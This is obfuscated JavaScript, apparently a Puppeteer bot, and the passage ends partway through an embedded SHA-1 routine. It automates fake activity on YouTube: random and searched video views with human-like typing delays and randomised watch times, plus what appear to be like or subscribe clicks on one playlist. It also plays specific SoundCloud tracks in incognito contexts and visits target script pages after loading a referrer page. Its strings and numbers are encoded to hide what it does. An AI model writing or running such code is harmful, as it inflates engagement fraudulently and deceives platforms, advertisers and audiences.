const W = c,
  V = d,
  T = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0x22a7 + 0x13 * 0x12e + 0x61f * 0x2))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x20df + -0x625 + -0x1aba), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xa559 + -0x1b2f * 0x5 + -0xef * -0x5e + (-0x17a9 + -0x8b * 0x39 + 0x7134) * random()) : await standardWaitForNetIdle(f), await wait(-0x566 + 0x2 * -0xdd3 + 0x3494 + (0x2615 * -0x2 + -0x13dd + 0x8717) * random()), 0x102e + -0xbf * -0x2f + 0x199f * -0x2;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x3d3 * -0x2 + 0xb * -0x2e9 + 0x2be5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x24e4 + 0x14 * 0x1b7 + -0x1 * 0x472f;
}
async function randomWait() {
  return await wait(-0x7 * -0x541 + -0x1b8 * 0x8 + -0x37f + (-0x115 * 0x19 + 0x7 * 0xe3 + -0x4 * -0xa18) * random()), 0x1403 + -0x1356 + -0xac;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x26a0 + -0x4f * -0x1d + 0x281 * -0x13, -0x3 * 0xc51 + 0xb4f * 0x1 + 0x19ab), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x2f95 * -0x3 + 0x118b9 + 0x6066) * getRandomInt(0xb99 + -0x1f97 + 0x1400, -0x1a5 * -0x5 + 0xdf * 0x25 + -0x286f * 0x1), h)), 0x47b + 0x232c * -0x1 + -0x2 * -0xf59;
}

function a() {
  const bm = [
    'CMWSwCoMWRddPa',
    'yWFcKeySjCkYxmoTW7y',
    'ChrZlZqWntK0mW',
    'BLHmr1e3uwvVrW',
    'ymk4nCoYW45cWRNdSdZcIa',
    'W6WkFGjfW5pcL8kjW4fq',
    '=0.9',
    '\x20beast\x20hin',
    'hash',
    'close',
    'rMLYzwzVEa',
    'oxpAvc6tDP',
    'j8oaWR49d1PwWPlcOYu',
    'C3LUxZuYntiZlW',
    'length',
    'https://op',
    'osu5nYvbrsvfnq',
    '2xcv7q3QhR',
    'gfdcP8ozWORcU8oZqZdcSa',
    'ChrZlZm3ndC5na',
    'unker-comi',
    'ng-soon',
    'e/slither.',
    '58e&utm_so',
    'rg/en/scri',
    'W4RcIYxdR8o0W73dONddPra',
    'z2v0',
    'W7ddHmojamkcW74'
  ];
  a = function() {
    return bm;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x800 + -0x10c1 + -0x1 * -0x18c1);
    let h = e[f];
    if (b['uxlfoc'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1d * -0xfe + 0x2d8 * -0xb + -0x282 * -0x1, s, t, u = -0x13f4 + 0x8bc + 0xb38; t = n['charAt'](u++); ~t && (s = r % (0x12e * 0x13 + 0x7 * 0x509 + 0x39a5 * -0x1) ? s * (-0x625 + -0x25af + -0xb6 * -0x3e) + t : t, r++ % (-0x8b4 + -0x15b * -0x10 + -0xcf8)) ? p += String['fromCharCode'](-0x8b * 0x13 + -0x1ca8 + 0x27f8 & s >> (-(0x2 * -0xdd3 + -0x100d + 0x2bb5) * r & -0x1f * 0x52 + 0x244b + 0x1a57 * -0x1)) : -0x2256 + 0x23f * 0xa + -0x17c * -0x8) {
          t = o['indexOf'](t);
        }
        for (let v = 0x13 * 0x17d + -0x1f02 + 0x2bb * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xd * -0x16d + 0x25e6 + -0x1b * 0xb7))['slice'](-(-0xe2c * -0x1 + -0xa47 + -0x3e3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x635 + 0x5 * 0x12 + -0x1 * 0x68f,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1403 + -0x1356 + -0xad; u < 0x26a0 + -0x4f * -0x1d + 0x2e93 * -0x1; u++) {
          p[u] = u;
        }
        for (u = -0x3 * 0xc51 + 0xb4f * 0x1 + 0x19a4; u < 0x1b3 * -0x7 + 0x1765 + -0xa80; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xb99 + -0x1f97 + 0x14fe), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1a5 * -0x5 + 0xdf * 0x25 + -0x143a * 0x2, q = 0x47b + 0x232c * -0x1 + -0x1b * -0x123;
        for (let v = 0x1 * 0x117 + 0x1e3 * -0x11 + -0x7bf * -0x4; v < n['length']; v++) {
          u = (u + (-0x2 * 0x720 + 0x2653 * 0x1 + -0x1812)) % (0x9f * 0x13 + 0x13a * 0x1b + 0x1 * -0x2beb), q = (q + p[u]) % (0x15b6 * -0x1 + 0x29 * 0x5d + 0x7d1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2 * -0xd5 + -0x1db9 + 0x1d0f)]);
        }
        return t;
      };
      b['XJLTIX'] = m, c = arguments, b['uxlfoc'] = !![];
    }
    const j = e[-0x507 * -0x2 + 0x1 * -0x1cc3 + 0x12b5],
      k = f + j,
      l = c[k];
    return !l ? (b['YLLEEu'] === undefined && (b['YLLEEu'] = !![]), h = b['XJLTIX'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * 0x117 + 0x1e3 * -0x11 + -0x7bf * -0x4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x2 * 0x720 + 0x2653 * 0x1 + -0x1812]['split']('\x20');
    for (let k = 0x9f * 0x13 + 0x13a * 0x1b + 0x3 * -0xef9; k < i['length']; k += 0x15b6 * -0x1 + 0x29 * 0x5d + 0x6d3)
      j += i[k] * h[i[k + (-0x2 * -0xd5 + -0x1db9 + 0x1c10)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x507 * -0x2 + 0x1 * -0x1cc3 + 0x12bb)['map'](l => Array['from'](l['children']))['flat'](-0x1d27 + 0x1 * 0x1c21 + 0x107 * 0x1)['map'](l => l['childNodes'][-0x2242 + 0x1aff * -0x1 + 0x1 * 0x3d42]['childNodes'][-0x149 + 0x327 + -0x1de]['childNodes'][0x1836 + -0x14c6 + -0x36f]['childNodes'][-0x159 * -0x7 + 0x182f + -0x219e]['childNodes'][0x38c + 0x7cc + -0xb57]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2b * -0x7f + 0x4cd * -0x7 + 0x102e, -0x195 + 0xb * 0x1 + -0x706 * -0x3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1a23 * -0x1 + 0x161 * -0x53 + 0x3 * 0x30f8);
  const h = await getMaxTime(f),
    i = Math['min']((0x5c29 * -0x1 + -0x19237 * -0x1 + -0x4bae) * getRandomInt(-0xf84 * 0x1 + 0x13cc + -0x446, -0x3 * -0x56c + 0x137b + -0x23ba), h);
  return await wait(i), 0x1 * -0xa37 + 0x18d + 0x7 * 0x13d;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2560 + -0x1cab * 0x1 + -0x8b5]['children'][-0x1 * -0x2221 + -0x1118 + 0x7 * -0x26f]['children'][-0xe87 + -0x9f * -0x25 + -0x4 * 0x21d]['children'][0x21d * 0x5 + 0x1 * -0x10c3 + 0x632]['children'][0xb8d + 0x2 * -0x4f6 + 0x3 * -0x8b]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x8 * -0x1d2 + -0x541 + -0x94e;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xf02 + -0x1d85 + 0xef9 * 0x3 + (-0x2295 + -0x13 * -0x59 + -0xc * -0x259) * random()
  }), await wait(0xada + -0xa23 * 0x3 + 0x1583 * 0x1 + (0x25bb * 0x1 + 0x137 * -0x16 + -0x9d5) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x49 * 0x73 + 0x1d66 + 0x367]['childNodes'][-0x1059 + -0x75d + 0x17b7]['childNodes'][-0x16 * 0x108 + -0x2561 + -0xa03 * -0x6]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1a4a + 0x11 * -0xe4 + 0x2973]['childNodes'][-0x1fdf + -0x1ac3 + 0x1d51 * 0x2]['childNodes'][-0x1be8 + -0x1 * -0x18d1 + 0x319]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x65 * -0x16 + -0x1b97 + 0x12ea),
          r = -0x1a4 + 0x1 * 0x1a3e + -0x189a;
        for (let u = -0x1c87 + -0x93 + 0x95 * 0x32; u < q['length']; u += -0x2352 + -0x89b + 0x2bef)
          r += q[u] * k[q[u + (0x226b + 0xa6 * -0x9 + -0x1c94)]];
        return r;
      }(n);
  });
  await wait((0x118f + 0x36da + -0xdd1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x11a5d + -0x5c16 * 0x1 + -0x47 * -0x9f) * getRandomInt(0x46 + 0x3 * 0x3d6 + 0x14f * -0x9, 0x1bc * 0x2 + -0x2b9 + -0xb5), h + (0x1 * 0x1e17 + -0x127f + -0x10 * -0x7f));
  return await wait(i), 0x1 * -0xef7 + 0x1 * -0x12b3 + 0x21ab;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x3 * 0x3 + -0x10d + 0xa * 0x1a), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x622 + 0x52 * 0x68 + -0xf76 + (-0x4a9 * 0x1 + -0x2012 + 0x1 * 0x28a3) * Math['random']());
    });
  }, -0x1 * 0x1687 + 0x1a4 + 0x303b);
  await wait(-0x45e9a + -0x1 * 0x46dc5 + -0xd603f * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x12907 + 0xe7a6 + -0x1264d) * getRandomInt(0x99a * 0x4 + -0x2 * -0x53f + -0x30e2, 0x9 * -0x361 + -0x8a1 * 0x4 + -0x11f * -0x3a)), clearInterval(h), 0xd91 + -0x2533 + -0x3 * -0x7e1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x800 + -0x10c1 + -0x1 * -0x18c1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x898 + 0x199e + 0x2236 * -0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0x1d6f + -0x1e46 + -0x4 * -0x36;
    await randomWait();
  }
  return -0xb7a + 0x1f5 + 0x986;
}

function fetchRandomSC() {
  const R = d;
  return Math['random']() <= 0x2215 + 0x2692 + -0x48a7 * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + R(0x17) + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x218d + 0x6b * 0x1 + 0x2122 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x19 * 0x99 + 0x144 + 0x9 * 0x185 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xa5f + 0x1 * 0x5e + 0xa01;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x5 * 0x1fd + -0x5d77 + -0x1034e * -0x1 + getRandomInt(0x4 * -0x1d36 + -0x435a + 0x50ee * 0x3, 0x552c + 0xc2a * 0x10 + 0x1b1a * -0x6));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x249b + 0x1 * -0x18fd + -0xb9d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x17f * -0x9 + 0x2011 * -0x1 + 0x2d88;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1b9a + -0x2e2 + 0x38 * -0x71, -0x3 * -0x6f + -0x1aa1 + -0x12 * -0x16b)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x17dd + -0x780 + -0x88d + floor((0x25c7 + -0x1 * -0x1273 + -0x3452) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x948362c8 + 0xae5 * -0x128ec6 + 0x1deb0d5e6),
          0x9f730f * 0x1 + -0x4cba0a + 0x2d46fb,
          -0x2e0e + -0xb * -0xb7c + 0x2fba,
          0x1 * -0x16b + -0x39 * 0x9d + 0x24e0
        ], y = [
          0x3d1 + 0x6 * -0x602 + -0x14b * -0x19,
          -0x3 * 0xc65 + -0x9d * 0x2f + 0x4212,
          -0x1 * 0x10f2 + -0xb1 * -0x2f + -0xf85,
          0x1185 + -0x1 * -0xf21 + -0x20a6
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x11fc * 0x1 + -0x22c8 + 0x34c5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1539 + 0x213c + 0x1227 * -0x3; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x280 + -0x1 * -0x2464 + 0x21e4 * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2e * -0x89 + -0x2 * 0x7f4 + -0x13 * -0x222] = A[0xec3 + -0x2594 + 0x16e1] = A[0x1241 + 0x2215 + -0x3455] = A[-0x48b * -0x1 + 0x1 * 0xb75 + -0xffe] = A[0x26bd + -0x28 * 0x37 + -0x1e22] = A[0x25e5 + 0x1f70 + -0x4551] = A[0x6 * 0x493 + 0x1655 + -0x1 * 0x31c2] = A[-0x56 * 0x6f + -0x44d + 0xddf * 0x3] = A[-0x7aa * -0x2 + 0x12 * 0xd0 + -0x1ded] = A[-0xb23 + -0x10e8 + 0x1c13] = A[0x1d * -0x127 + 0x1 * 0x1087 + 0x10ed * 0x1] = A[-0x14 * -0x12a + 0x105 * -0x5 + -0x5 * 0x3a1] = A[0x39 * 0x35 + -0x14d1 * -0x1 + -0x2093] = A[0x24b4 + -0x1d2 + -0x22d6] = A[0x447 + -0x35c + -0xde] = A[0x521 + 0x1d * -0xbc + 0x1039] = A[-0x2168 + -0x83d * -0x3 + 0x8c0] = -0x1 * -0x265e + -0x2238 + -0x426, this['blocks'] = A) : this['blocks'] = [
                0x2 * 0x11f5 + -0x282 + -0x2168,
                -0x4 * -0x2f1 + -0x2c4 + 0x1 * -0x900,
                0x1b99 + -0x1 * -0x2263 + -0x3dfc,
                0x1a5c + 0x1 * 0x11a8 + 0x12 * -0x272,
                -0xe53 + 0x16fd + -0x8aa,
                -0x10d * -0x20 + -0x1237 + -0xf69,
                0x1 * -0x2572 + 0x254 * -0x8 + 0x3812,
                0x1388 + -0x4 * 0x7ca + 0x3 * 0x3e0,
                0x1a81 + -0x1a80 + 0x1 * -0x1,
                0x18f6 + -0xa61 * 0x1 + -0xe95 * 0x1,
                -0x2038 + 0x747 * 0x1 + 0x18f1,
                0x583 + -0x3 * -0x3f3 + -0x115c,
                0x1 * 0x2522 + 0x68b + 0x3 * -0xe8f,
                -0x13f * 0x18 + -0x813 + -0x25fb * -0x1,
                0x186 + 0x1c31 + -0x1db7,
                0x3 * 0x111 + 0x15eb * -0x1 + 0x12b8,
                0x45 * 0x87 + -0xc7f + -0x17e4
              ], this['h0'] = 0x3361c3 * -0x24b + 0x371f * -0x1a6bc + 0x1381be1e6, this['h1'] = 0x3 * 0x9eda8ed9 + -0x801b09de * -0x2 + -0x1ecf814be, this['h2'] = 0xd759dfb2 + 0x74f80b51 + -0xb3970e05, this['h3'] = 0x1 * 0x143a828b + -0x116c4cdd + 0xd641ec8, this['h4'] = 0x174a1e951 * 0x1 + -0x6 * -0x3493de3f + -0x1ec463cdb, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x7c1 * -0x1 + -0x151b + 0x1cdc, this['finalized'] = this['hashed'] = 0x250c + 0x1 * -0xeed + -0x161f, this['first'] = -0x62 * -0x49 + -0x107 * 0x7 + -0x1 * 0x14c0;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1955 + -0x747 + -0x120e, O = J['length'] || 0x1 * 0x234a + -0x20a5 + -0x2a5 * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1f0 * 0xc + -0x1d7b + 0x63b * 0x1, P[-0x2 * -0x7ed + -0x442 + -0x173 * 0x8] = this['block'], P[-0x26ef + 0x484 + 0xd * 0x2a7] = P[0x8a1 + -0x29 * 0x1f + -0x1 * 0x3a9] = P[-0x2 * -0xaf3 + -0x1 * -0x61f + 0x1 * -0x1c03] = P[0xba + 0x17 * -0x15d + 0x1ea4] = P[0x1f22 + 0x1 * -0x19ab + -0x3 * 0x1d1] = P[-0x12f1 + -0x17 * -0x5 + 0x1283] = P[-0x1 * 0x198e + -0x5 * -0x25b + -0x1 * -0xdcd] = P[-0x1825 + -0x10f * -0x19 + -0x24b] = P[0x832 + 0x55d * -0x1 + 0x1 * -0x2cd] = P[-0x1 * -0xfab + -0x743 * -0x2 + -0xc1 * 0x28] = P[-0x2 * -0x1079 + -0x1a2 * 0x10 + -0x6c8] = P[-0x241 + 0x362 + 0x1 * -0x116] = P[-0x1 * 0x17d5 + 0x25f1 + -0xe10] = P[-0x1f * 0x43 + 0x48 * -0x7 + 0xa22] = P[-0x2 * 0xc15 + 0x1ca7 + -0x46f] = P[-0x2 * 0xe7f + 0x9 * -0x337 + -0x39fc * -0x1] = -0x53b * 0x7 + -0xb5a + 0x2ff7), K) {
                    for (N = this['start']; M < O && N < -0x1b6e + 0x1cdf + 0x1 * -0x131; ++M)
                      P[N >> -0x3b * -0x99 + -0x1f * -0x65 + -0xbdf * 0x4] |= J[M] << y[-0x1e74 + 0x1a6c + 0x40b & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x5e * 0x2e + -0x2cf + -0x13f3 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x16ba + -0x62d + 0x24b * -0x7 ? P[N >> -0x113c + -0x1 * -0x14c9 + -0x1 * 0x38b] |= L << y[0x18 * -0x115 + 0x57 * -0x1d + 0x23d6 & N++] : L < -0x11a8 + -0x1 * 0x1c8d + -0x3635 * -0x1 ? (P[N >> 0x9a9 + 0x25a4 + -0x2f4b] |= (-0x9d1 + -0x11a3 + 0x26 * 0xbe | L >> -0x1e24 + -0x9f * -0x3 + -0x96f * -0x3) << y[-0x6 * -0x4d3 + -0x956 * 0x4 + -0x869 * -0x1 & N++], P[N >> -0x1f * 0x91 + 0x103 * 0x17 + -0x5b4] |= (-0x3f5 * 0x8 + -0x238c + 0x43b4 | 0x25ea + -0x13 * -0x1c6 + -0x475d * 0x1 & L) << y[0x775 + 0x20a0 + -0x2812 & N++]) : L < 0x33 * 0x2f4 + -0x254f * -0x5 + -0x5 * 0x183b || L >= 0xb * -0x1e2f + 0x6207 * 0x1 + -0x3 * -0x98aa ? (P[N >> 0x1be8 + 0x16 * -0x1ab + 0x8cc * 0x1] |= (-0x1299 + -0x688 + -0x13d * -0x15 | L >> 0x2c * -0x95 + 0x5 * 0x6af + -0x7c3 * 0x1) << y[0xe95 * -0x2 + -0x53a * 0x2 + 0x27a1 * 0x1 & N++], P[N >> 0xe3 + -0x15cb * 0x1 + 0x14ea] |= (-0x1da6 + 0x4c * -0x61 + 0x3af2 | L >> 0xac + -0x14 * -0x151 + -0x1 * 0x1afa & -0x1 * -0x1c74 + 0x2016 + -0x3c4b) << y[-0x71 * -0xa + -0x1 * 0x547 + 0xe0 & N++], P[N >> -0x5 * 0x2c9 + -0x2a * 0x17 + -0x11b5 * -0x1] |= (-0x1e9 + -0x1466 + 0x16cf | 0x1774 + -0x666 + -0x10cf & L) << y[0x1fa + -0x1468 + 0x1271 & N++]) : (L = 0x14f89 + -0x1d * -0xd1d + -0x1cbd2 + ((0x343 * 0x4 + 0xa7b * -0x1 + -0x7a * -0x3 & L) << 0x250c + -0x22e2 + 0x4 * -0x88 | 0x11 * 0x17d + 0x105b + -0x25a9 & J['charCodeAt'](++M)), P[N >> -0x29 * 0xed + -0x65 * -0x19 + 0x1c1a] |= (-0x805 + -0x2395 + 0x2c8a | L >> -0x27 * -0x79 + 0x16e0 + -0x293d) << y[0x23 * -0xa1 + 0x2068 + -0xa62 & N++], P[N >> -0x163 * 0x5 + -0x271 + 0x962] |= (-0x2128 + -0x1c13 * 0x1 + -0x1 * -0x3dbb | L >> 0x12e3 + 0x1 * -0xde1 + -0x4f6 & -0x1bf * -0x13 + -0x1 * -0xaa6 + -0x2b94) << y[-0x2 * 0xb41 + 0x254d + -0x764 * 0x2 & N++], P[N >> 0x80b + 0x3 * 0x7e1 + -0x1fac] |= (0x1fc6 + -0x8c5 * 0x2 + -0x24a * 0x6 | L >> 0x1268 + 0x11c6 + -0x2428 & 0x1b8a + 0x1508 + -0x1 * 0x3053) << y[-0x1 * -0x1333 + -0x1 * 0x24e0 + -0x11b0 * -0x1 & N++], P[N >> -0x1a4 + 0x34a * 0x4 + 0x1eb * -0x6] |= (-0x8 * 0xb4 + -0xafa + 0xc7 * 0x16 | 0x14 * -0x148 + -0x4d7 * 0x6 + 0x36e9 * 0x1 & L) << y[0x1c1f + 0x3a9 + -0xa97 * 0x3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1d7a + -0xae1 + 0xb * -0x1ab ? (this['block'] = P[0x166a + -0x40f * -0x7 + 0x71 * -0x73], this['start'] = N - (-0x1 * -0x2166 + 0x1cfa + -0x7c4 * 0x8), this['hash'](), this['hashed'] = -0x9ad + 0x1d6f + 0x1 * -0x13c1) : this['start'] = N;
                }
